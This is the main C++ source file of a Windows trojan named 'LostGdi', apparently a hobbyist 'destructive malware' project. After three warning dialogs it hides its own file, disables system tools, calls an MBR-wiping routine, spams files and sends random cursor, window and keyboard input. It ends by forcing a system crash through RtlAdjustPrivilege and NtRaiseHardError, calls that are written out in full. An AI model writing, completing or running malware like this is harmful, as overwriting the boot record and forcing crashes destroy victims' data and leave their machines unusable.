#include <Windows.h>
#include "funcs.h"

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, PBYTE);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PDWORD_PTR, DWORD, PDWORD);

int WINAPI WinMain(HINSTANCE hinst, HINSTANCE hprevinst, LPSTR cmdline, int cmdshow) {
	Files::HideMalwareFile();
	if (MessageBoxW(NULL, L"You are about to run a copy of the LostGdi trojan horse made by Tubercomiosis.\r\nIt will damage your computer and make it unusable.\r\n\r\nThis malware doesn\'t have GDI.\r\nPress Yes to execute.", L"LostGdi.exe trojan alert", MB_YESNO|MB_DEFBUTTON2|MB_ICONEXCLAMATION) == IDNO)
	{
		return 0;
	}
	if (MessageBoxW(NULL, L"Second warning!\r\nRunning this non-GDI malware could potentially harm all your data!\r\nOnly execute it on a virtual machine.\r\nPress Yes to proceed.", L"AHHHH", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) == IDNO)
	{
		return 0;
	}
	if (MessageBoxW(NULL, L"Last chance.\r\nThis is your final chance before executing this potentially malicious trojan.\r\nIf you want to destroy your hardware, press Yes to continue.\r\nIf not, press No.", L"MY PC IS GETTING DEFORMED", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) == IDNO)
	{
		return 0;
	}
	Destroy::SystemDisabler();
	MessageBoxW(NULL, L"If you close me, your PC will die.", L"bruh", MB_OK);
	Destroy::KillMBR();
	Sleep(5000);
	Notepad::CreateDestructionNote();
	Sleep(10000);
	exec::pxc("taskmgr");
	Sleep(2000);
	CreateThread(NULL, 0, Files::Spammer, NULL, 0, 0);
	CreateThread(NULL, 0, Movement::SetRandCursorPos, NULL, 0, 0);
	CreateThread(NULL, 0, Movement::SetBounceWndPos, NULL, 0, 0);
	CreateThread(NULL, 0, Inputs::InputKeyboard, NULL, 0, 0);
	CreateThread(NULL, 0, Sounds::PlayRndSounds, NULL, 0, 0);
	Sleep(30000);
	BYTE ntByte;
	DWORD ntResponse;
	RtlAdjustPrivilege(19, true, false, &ntByte);
	NtRaiseHardError(0xC0000011, 0, 0, 0, 6, &ntResponse);
	Sleep(-1);
}
